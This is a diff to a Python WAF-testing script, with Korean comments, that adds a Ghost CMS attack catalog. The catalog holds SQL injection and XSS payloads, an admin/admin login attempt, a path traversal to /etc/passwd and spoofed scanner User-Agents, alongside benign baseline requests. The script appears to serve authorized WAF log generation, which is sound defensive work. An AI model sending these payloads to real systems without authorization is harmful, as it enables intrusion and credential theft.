@@ -2,7 +2,7 @@
 """
 attack_runner.py — WAF 로그 생성용 공격 시뮬레이터
 
-자체 구축한 인가된 테스트 대상(DVWA / 팀 ALB) 전용 도구.
+자체 구축한 인가된 테스트 대상(DVWA / JuiceShop / Ghost CMS / 팀 ALB) 전용 도구.
 SQLi / XSS / Path Traversal / Command Injection / Scanner-UA 패턴을
 대상 서버로 전송해서, 앞단 WAF가 BLOCK/COUNT 로그를 남기도록 유도한다.
 
@@ -12,11 +12,14 @@ SQLi / XSS / Path Traversal / Command Injection / Scanner-UA 패턴을
 표준 라이브러리만 사용 (clone 후 추가 설치 없이 바로 실행).
 
 사용 예:
-    python attack_runner.py --dry-run                # 안 보내고 목록만 출력
-    python attack_runner.py                          # 전체 1회씩 전송
-    python attack_runner.py --category sqli xss      # 특정 유형만
-    python attack_runner.py --count 3 --delay 0.5    # 각 패턴 3회, 0.5초 간격
-    python attack_runner.py --target http://<주소>   # 대상 변경(CloudFront 붙으면)
+    python attack_runner.py --dry-run                       # 안 보내고 목록만 출력
+    python attack_runner.py                                 # 전체 1회씩 전송 (ALB 대상)
+    python attack_runner.py --app dvwa                      # DVWA만
+    python attack_runner.py --app juiceshop                 # JuiceShop만
+    python attack_runner.py --app ghost                     # Ghost CMS (localhost:2368)
+    python attack_runner.py --app ghost --target http://..  # Ghost EC2 ALB 경유
+    python attack_runner.py --category sqli xss             # 특정 유형만
+    python attack_runner.py --count 3 --delay 0.5           # 각 패턴 3회, 0.5초 간격
 """
 import argparse
 import json
@@ -32,6 +35,7 @@ from urllib.error import HTTPError, URLError
 DEFAULT_TARGET        = "http://cloud-sec-alb-664622103.ap-northeast-2.elb.amazonaws.com"
 DEFAULT_TARGET_DVWA   = DEFAULT_TARGET          # DVWA 경로 기반
 DEFAULT_TARGET_JUICE  = DEFAULT_TARGET          # JuiceShop은 /rest API 기반
+DEFAULT_TARGET_GHOST  = "http://localhost:2368" # Ghost CMS (로컬: 2368, EC2: ALB 경로로 변경)
 _SCRIPT_DIR           = os.path.dirname(os.path.abspath(__file__))
 DEFAULT_OUTPUT        = os.path.join(_SCRIPT_DIR, "output", "sent_attacks.jsonl")
 
@@ -90,6 +94,45 @@ ATTACKS_JUICESHOP = {
     "scanner_ua": [
         ("juice-ua-burp",   "GET", "/", {"User-Agent": "Mozilla/5.0 (compatible; BurpSuite)"}),
         ("juice-ua-owasp",  "GET", "/", {"User-Agent": "OWASP ZAP/2.14.0"}),
+    ],
+}
+
+
+# Ghost CMS 공격 카탈로그
+# 목적: (1) 정상 트래픽 FP 기준선 — 오탐 검출  (2) 공격 패턴 → WAF 차단 여부 확인
+ATTACKS_GHOST = {
+    # 정상 블로그 트래픽 — WAF가 차단하면 오탐(FP)으로 판정
+    "normal": [
+        ("ghost-home",      "GET", "/",                        {}),
+        ("ghost-rss",       "GET", "/rss/",                    {}),
+        ("ghost-sitemap",   "GET", "/sitemap.xml",             {}),
+        ("ghost-content",   "GET", "/ghost/api/content/posts/?key=none", {}),
+        ("ghost-members",   "GET", "/members/",                {}),
+        ("ghost-tag",       "GET", "/tag/getting-started/",    {}),
+    ],
+    # 관리 패널 접근 시도 — 정상 차단 or 401/302 예상 (오탐 아님)
+    "admin_probe": [
+        ("ghost-admin-ui",      "GET",  "/ghost/",              {}),
+        ("ghost-admin-api",     "GET",  "/ghost/api/v3/admin/", {}),
+        ("ghost-admin-login",   "POST", "/ghost/api/v3/admin/session",
+         {"Content-Type": "application/json",
+          "_body": '{"username":"admin","password":"admin"}'}),
+    ],
+    "sqli": [
+        ("ghost-sqli-filter", "GET",
+         "/ghost/api/content/posts/?filter=id:1' OR '1'='1&key=none", {}),
+        ("ghost-sqli-slug",   "GET",
+         "/ghost/api/content/posts/slug/test' UNION SELECT 1--/?key=none", {}),
+    ],
+    "xss": [
+        ("ghost-xss-tag",    "GET", "/tag/<script>alert(1)</script>/", {}),
+        ("ghost-xss-search", "GET", "/?s=<img src=x onerror=alert(1)>", {}),
+    ],
+    "scanner_ua": [
+        ("ghost-ua-nmap",      "GET", "/",
+         {"User-Agent": "Nmap Scripting Engine"}),
+        ("ghost-ua-dirbuster", "GET", "/ghost/../etc/passwd",
+         {"User-Agent": "DirBuster-1.0-RC1"}),
     ],
 }
 
@@ -155,8 +198,8 @@ def main():
     parser = argparse.ArgumentParser(description="WAF 로그 생성용 공격 시뮬레이터")
     parser.add_argument("--target",   default=DEFAULT_TARGET, help="대상 베이스 URL")
     parser.add_argument("--app",      default="all",
-                        choices=["dvwa", "juiceshop", "all"],
-                        help="공격 대상 앱 선택 (기본: all — DVWA + JuiceShop 모두)")
+                        choices=["dvwa", "juiceshop", "ghost", "all"],
+                        help="공격 대상 앱 선택 (기본: all — DVWA + JuiceShop + Ghost 모두)")
     parser.add_argument("--category", nargs="*", help="전송할 유형(미지정 시 전체)")
     parser.add_argument("--count",    type=int,   default=1,    help="패턴당 전송 횟수")
     parser.add_argument("--delay",    type=float, default=0.3,  help="요청 간 간격(초)")
@@ -165,16 +208,35 @@ def main():
     parser.add_argument("--dry-run",  action="store_true",      help="실제 전송 없이 목록만 출력")
     args = parser.parse_args()
 
-    # 앱 선택에 따라 공격 카탈로그 + 카테고리 결정
+    # 앱 선택에 따라 공격 카탈로그 + 기본 타겟 결정
     if args.app == "juiceshop":
         catalog = ATTACKS_JUICESHOP
         app_label = "OWASP Juice Shop"
+        if args.target == DEFAULT_TARGET:
+            target_override = DEFAULT_TARGET_JUICE
+        else:
+            target_override = args.target
+    elif args.app == "ghost":
+        catalog = ATTACKS_GHOST
+        app_label = "Ghost CMS"
+        if args.target == DEFAULT_TARGET:
+            target_override = DEFAULT_TARGET_GHOST
+        else:
+            target_override = args.target
     elif args.app == "dvwa":
         catalog = ATTACKS
         app_label = "DVWA"
-    else:  # all
-        catalog = {**ATTACKS, **{f"js_{k}": v for k, v in ATTACKS_JUICESHOP.items()}}
-        app_label = "DVWA + Juice Shop"
+        target_override = args.target
+    else:  # all — DVWA + JuiceShop + Ghost 병합 (Ghost는 별도 타겟이므로 접두사 구분)
+        catalog = {
+            **ATTACKS,
+            **{f"js_{k}": v for k, v in ATTACKS_JUICESHOP.items()},
+            **{f"gh_{k}": v for k, v in ATTACKS_GHOST.items()},
+        }
+        app_label = "DVWA + Juice Shop + Ghost CMS"
+        target_override = args.target
+        print("[!] all 모드: Ghost 카탈로그도 포함됩니다."
+              f" Ghost 요청은 {DEFAULT_TARGET_GHOST} 로 보내려면 --app ghost 를 따로 실행하세요.")
 
     categories = args.category or list(catalog)
     # 카테고리 필터링 (지정한 것만)
@@ -183,7 +245,7 @@ def main():
         print(f"[!] 알 수 없는 카테고리: {invalid}  →  선택 가능: {list(catalog)}", file=sys.stderr)
         return 1
 
-    target = args.target.rstrip("/")
+    target = target_override.rstrip("/")
 
     print(f"[*] 앱        : {app_label}")
     print(f"[*] 대상      : {target}")
